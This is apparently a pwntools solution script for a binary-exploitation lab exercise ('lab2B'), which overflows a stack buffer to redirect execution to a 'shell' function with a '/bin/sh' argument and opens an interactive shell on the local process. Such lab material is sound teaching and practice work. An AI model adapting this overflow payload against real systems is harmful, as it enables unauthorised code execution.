#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab2B')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def solve():

    offset = 27
    sh = next(exe.search(b"/bin/sh\x00"))
    shell = exe.sym["shell"]
    
    payload = b"A"*offset + p32(shell) + p32(0x41424344) + p32(sh)

    # write('payload', payload)

    io = process([exe.path, payload])

    io.interactive()


def main():
    
    solve()
    

if __name__ == '__main__':
    main()

